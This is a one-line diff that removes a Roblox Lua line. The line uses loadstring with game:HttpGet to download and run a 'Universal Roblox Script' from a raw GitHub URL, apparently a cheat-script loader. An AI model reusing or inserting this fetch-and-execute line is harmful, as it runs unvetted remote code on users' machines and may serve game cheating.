@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Chadli444/Chadlix-Universal-Roblox-Script/main/Main.lua"))()
